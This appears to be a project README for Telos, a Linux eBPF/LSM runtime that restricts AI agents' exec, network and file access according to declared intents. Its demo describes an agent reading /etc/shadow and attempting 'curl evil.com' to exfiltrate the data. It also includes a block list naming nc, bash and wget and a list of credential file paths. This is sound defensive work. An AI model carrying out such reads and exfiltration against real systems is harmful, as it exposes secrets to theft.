<p align="center">
  <img src="https://img.shields.io/badge/Kernel-eBPF%20%2F%20LSM-orange?style=for-the-badge&logo=linux" />
  <img src="https://img.shields.io/badge/AI%20Engine-Cortex-blueviolet?style=for-the-badge&logo=openai" />
  <img src="https://img.shields.io/badge/XDP-Hyperion%20Bridge-00b894?style=for-the-badge&logo=fastify" />
  <img src="https://img.shields.io/badge/Version-1.0-blue?style=for-the-badge" />
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" />
</p>

<h1 align="center">🛡️ TELOS</h1>
<h3 align="center"><em>Intent-Based Runtime Security for Autonomous AI Agents</em></h3>

<p align="center">
  <b>Telos is a Linux kernel-level security runtime that enforces AI agent behavior<br>
  through Natural Language Intent Declarations, eBPF/LSM syscall gates,<br>
  and real-time Information Flow Control.</b>
</p>

---

## ⚡ TL;DR

> Programs declare **what they intend to do** in plain English.  
> Telos translates that intent into **kernel-enforced boundaries** — in real-time.  
> If a program breaks its promise, the kernel **kills it instantly**.

```
Agent: "I need to download a weather report"
Telos: ✅ curl → ALLOWED | ✅ weather.com → ALLOWED
       ❌ nc  → BLOCKED  | ❌ /etc/shadow → BLOCKED → 🔒 NETWORK SLAM
```

---

## 🧬 Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        AI AGENT (User Space)                    │
│   Declares Intent: "Download weather data from weather.com"     │
└──────────────────────────────┬──────────────────────────────────┘
                               │ gRPC
┌──────────────────────────────▼──────────────────────────────────┐
│                    🧠 CORTEX (Python Intelligence)               │
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌────────────────────────┐ │
│  │ Domain Intel  │  │  Exec Intel  │  │    LLM Verifier        │ │
│  │ (L0-L4 Score) │  │ (LOLBin Det) │  │ (Escalation Only)      │ │
│  └──────┬───────┘  └──────┬───────┘  └────────────────────────┘ │
│         │                 │                                      │
│  ┌──────▼─────────────────▼──────────────────────────────────┐  │
│  │              Intent Verifier (Dual-Gate Router)            │  │
│  │   Network Gate: classify domains → allow/deny/escalate     │  │
│  │   Exec Gate:    classify binaries → allowlist per-intent   │  │
│  └──────────────────────────┬────────────────────────────────┘  │
│                             │ IPC (Unix Socket)                  │
└─────────────────────────────┼────────────────────────────────────┘
                              │
┌─────────────────────────────▼────────────────────────────────────┐
│               🔒 eBPF KERNEL DATA PLANE (C + Go Loader)          │
│                                                                   │
│  ┌────────────────┐ ┌────────────────┐ ┌───────────────────────┐ │
│  │ bprm_check     │ │ socket_connect │ │ file_open             │ │
│  │ (Exec Gate)    │ │ (Network Gate) │ │ (IFC Taint Tracker)   │ │
│  └────────────────┘ └────────────────┘ └───────────────────────┘ │
│                                                                   │
│  Maps: process_map │ network_map │ exec_policy_map │ inode_map   │
│        config_map  │ mirage_map  │ taint tracking (LRU)          │
└──────────────────────────────────────────────────────────────────┘
                              │
                    ┌─────────▼─────────┐
                    │  ⚡ HYPERION XDP   │
                    │  (Wire-Speed Drop) │
                    │  blacklist_map     │
                    └───────────────────┘
```

---

## 🎯 Key Features

| Feature | Description |
|:--------|:-----------|
| 🧠 **Intent-Based Policy** | Agents declare goals in natural language — policies are auto-generated |
| 🔐 **Dual-Gate Enforcement** | Separate Execution Gate (`execve`) and Network Gate (`socket_connect`) |
| 🩸 **Dynamic IFC (Taint Tracking)** | Touching sensitive files elevates taint → triggers Network Slam |
| 🌐 **Domain Intelligence Engine** | O(1) SQLite-backed scoring: typosquat detection, reputation, homoglyphs |
| ⚔️ **LOLBin Defense** | Blocks living-off-the-land binaries (`nc`, `bash`, `wget`) per-intent |
| 🕰️ **Dynamic Drawbridge Timer** | Network windows auto-expire after intent TTL |
| 📡 **DNS Interception Proxy** | Transparent DNS proxy with real-time domain classification |
| 🪤 **Mirage Deception Engine** | Honeypot files that trap and fingerprint attacker behavior |
| 💓 **Fail-Open/Fail-Closed Watchdog** | Bidirectional heartbeat between eBPF and Cortex planes |
| 📊 **Prometheus Observability** | Enterprise-grade metrics on port `:9094/metrics` |
| ⚡ **Hyperion XDP Bridge** | Malicious IPs pushed to XDP for wire-speed packet drops |

---

## 🚀 Getting Started

### Prerequisites

- **Linux Kernel** ≥ 5.15 (eBPF LSM support required)
- **Go** ≥ 1.21
- **Python** 3.10+
- **clang** / **llvm** (for eBPF compilation)
- **bpftool** (for BTF/vmlinux generation)

### Installation

```bash
git clone https://github.com/nevinshine/telos-runtime.git
cd telos-runtime

# Install Python dependencies
pip install -r cortex/requirements.txt

# (Optional) Download the LLM model for control-plane escalation
./scripts/download_model.sh
```

### Running Telos

```bash
# Start the full runtime (builds + launches eBPF Daemon + Cortex AI)
sudo telos start

# Check system health
sudo telos status

# Launch the real-time Telemetry Dashboard
sudo telos dash

# Gracefully stop all components
sudo telos stop

# View help
telos help
```

---

## 🧪 Demonstration

### Phase 7: Data Exfiltration Prevention (IFC Network Slam)

```bash
# Start Telos
sudo telos start

# Run the IFC demo — agent reads /etc/shadow then tries to exfiltrate
sudo python3 demo_ifc.py
```

**What happens:**
1. Agent declares: _"I need to check security compliance"_ → `curl` + `cat` allowed
2. Agent reads `/etc/shadow` → eBPF elevates taint to `CRITICAL`
3. Agent tries `curl evil.com` → **Network Slam** → `-EPERM` → connection killed
4. Data never leaves the machine 🔒

### Phase 13: Hyperion XDP Bridge

```bash
# Terminal 1: Start Hyperion XDP
cd ~/code/hyperion-xdp
sudo ./bin/hyperion_ctrl -iface wlp1s0 -telemetry

# Terminal 2: Start Telos
cd ~/code/telos-runtime
sudo telos start

# Terminal 3: Trigger a malicious domain lookup
python3 -c "
from dnslib import DNSRecord
q = DNSRecord.question('githuh.com')
r = q.send('127.0.0.1', 5353, tcp=False, timeout=5)
print(DNSRecord.parse(r))
"
```

**Watch Terminal 1:** `[TELOS-RPC] 🛡️ Added 97.107.140.81 to XDP Blacklist`

---

## 📐 Project Structure

```
telos-runtime/
├── telos                    # 🎮 CLI Orchestrator
├── cortex/                  # 🧠 AI Intelligence Engine
│   ├── main.py              #    Cortex gRPC Server
│   ├── verifier.py          #    Dual-Gate Intent Verifier
│   ├── domain_intel.py      #    Domain Intelligence (L0-L4)
│   ├── exec_intel.py        #    Execution Intelligence (LOLBin)
│   ├── dns_proxy.py         #    DNS Interception Proxy
│   ├── guardian.py          #    Agent Registry & Taint Manager
│   ├── llm_verifier.py      #    LLM Escalation (Control Plane)
│   ├── mirage_manager.py    #    Deception Engine
│   └── policy.yaml          #    Security Policy Configuration
├── telos_core/              # 🔒 eBPF Kernel Security Module
│   ├── src/bpf_lsm.c        #    LSM Hooks (exec, file, connect)
│   ├── loader/main.go        #    Go eBPF Loader + IPC + Prometheus
│   └── maps/                 #    Shared map definitions
├── shared/                  # 📡 gRPC Protocol Definitions
│   ├── protocol.proto        #    Protobuf schema
│   └── common_maps.h         #    Shared C struct definitions
├── browser_eye/             # 👁️ Chrome Extension (Browser Taint)
├── deploy/                  # 🐳 Docker + Systemd Configs
│   ├── telos-loader.service  #    Go Daemon systemd unit
│   ├── telos-cortex.service  #    Python Cortex systemd unit
│   └── vulnerable_agent/     #    Red team simulation scripts
├── benchmarks/              # 📊 Performance & Stress Tests
├── tests/                   # ✅ Verification Scripts
├── demo_payload.py          # 🎯 Phase 5 Demo (Exec Gate)
├── demo_ifc.py              # 🩸 Phase 7 Demo (IFC Network Slam)
└── Makefile                 # ⚙️ Build system
```

---

## 🏗️ Engineering Phases

<details>
<summary><b>Phase 1–3: Foundation</b> — Intent Networking & Chrome Extension</summary>

- Established the Cortex AI gRPC server and eBPF socket map
- Built the Browser Eye Chrome extension for pre-OS URL taint detection
- Connected natural language intents to dynamic kernel drawbridges

</details>

<details>
<summary><b>Phase 4: DNS Interception & Domain Intelligence</b></summary>

- SQLite-backed domain scoring engine with 5 classification layers:
  - **L0** — Root domain extraction (subdomain/combo-squat defense)
  - **L1** — Exact match (hash index)
  - **L2** — Typosquat detection (Levenshtein + homoglyph + embedded brand)
  - **L3** — Category mismatch scoring (intent → allowed categories)
  - **L4** — Reputation + risk flag scoring
- Transparent DNS proxy on port `5353` with iptables redirection

</details>

<details>
<summary><b>Phase 5: Execution Boundary</b> — Syscall-Level LOLBin Defense</summary>

- `bprm_check_security` LSM hook intercepts every `execve()` call
- Per-intent execution allowlists stored in `exec_policy_map`
- Parent-inheritance tracking prevents fork/exec bypass
- Execution Intelligence Engine classifies binaries by risk category

</details>

<details>
<summary><b>Phase 6: Telemetry Dashboard</b></summary>

- Split-screen terminal UI: Cortex AI events + Kernel eBPF events
- Real-time tail of intent declarations, blocks, and taint mutations

</details>

<details>
<summary><b>Phase 7: Dynamic Data-Flow Tracking (IFC)</b> — The Capstone</summary>

- Cross-vector taint propagation: file access → network revocation
- `file_open` hook monitors inode sensitivity map
- Reading a `CRITICAL` file elevates taint to `TAINT_CRITICAL`
- `socket_connect` hook enforces **Network Slam** — drops all connections
- Prevents data exfiltration even when the agent has legal network access

</details>

<details>
<summary><b>Phase 8: CLI & Documentation Polish</b></summary>

- `telos` CLI orchestrator with `start`, `stop`, `status`, `dash`, `help`
- Comprehensive whitepaper documenting the architecture

</details>

<details>
<summary><b>Phase 9: Extreme Contention Benchmarking</b></summary>

- 10M-operation stress tests across 100 concurrent threads
- File open overhead: **+2.27µs** (+8.5%)
- Exec gate overhead: **+193µs** (+3.0%)
- Network gate overhead: **+3.88µs** (+1.9%)

</details>

<details>
<summary><b>Phase 10: LRU State Management</b></summary>

- Migrated `process_map` and `network_map` to `BPF_MAP_TYPE_LRU_HASH`
- Kernel-level pressure valve: graceful eviction under memory pressure

</details>

<details>
<summary><b>Phase 11: Fail-Open / Fail-Closed Heartbeat</b></summary>

- Bidirectional watchdog between Go eBPF daemon and Python Cortex
- `TELOS_FAIL_POLICY=open` → Audit-only mode (preserves uptime)
- `TELOS_FAIL_POLICY=closed` → Full network flush (zero-trust lockdown)

</details>

<details>
<summary><b>Phase 12: Enterprise Observability</b></summary>

- Prometheus metrics endpoint on `:9094/metrics`
- Counters: `telos_exec_blocks_total`, `telos_network_blocks_total`, `telos_ifc_elevations_total`
- Gauge: `telos_active_drawbridges`
- Systemd service files for production deployment

</details>

<details>
<summary><b>Phase 13: Hyperion XDP Bridge</b></summary>

- Telos Domain Intelligence pushes malicious IPs to Hyperion XDP
- HTTP RPC bridge on `:9095/block`
- Hyperion `blacklist_map` drops packets at NIC level (`XDP_DROP`)
- Wire-speed enforcement — packets killed before reaching the network stack

</details>

---

## 📊 Performance

Benchmarked under **10 Million operations** across **100 concurrent threads**:

| Syscall Hook | Native Baseline | Telos Guarded | Overhead |
|:-------------|:-:|:-:|:-:|
| `file_open` (IO) | 26.51 µs | 28.79 µs | **+2.27 µs** (+8.5%) |
| `bprm_check_security` (Exec) | 6431 µs | 6625 µs | **+193 µs** (+3.0%) |
| `socket_connect` (Network) | 195.57 µs | 199.46 µs | **+3.89 µs** (+1.9%) |

> Sub-microsecond map lookups. Zero-copy ringbuf telemetry.  
> Production-grade overhead at enterprise scale.

---

## 🔧 Configuration

Edit `cortex/policy.yaml` to customize:

```yaml
execution:
  default_mode: enforce          # enforce | audit
  safe_binaries:                 # Always allowed (system essentials)
    - cat
    - ls
    - curl

network:
  always_allowed:                # Pre-authorized destinations
    - api.weather.com
    - github.com

filesystem:
  sensitive_paths:               # Files that trigger taint elevation
    - /etc/shadow
    - /etc/passwd
    - ~/.ssh/id_*
```

---

## 🛠️ Development

```bash
# Build eBPF objects only
make bpf

# Build Go loader only
make loader

# Full build (BPF + Loader)
make all

# Run tests
cd tests && bash verify.sh

# Run benchmarks
cd benchmarks && python3 lsm_bench.py
```

---

## 📄 License

MIT License — see [LICENSE](LICENSE).

---

<p align="center">
  <b>Telos</b> — <em>Because intent should be the perimeter.</em>
</p>
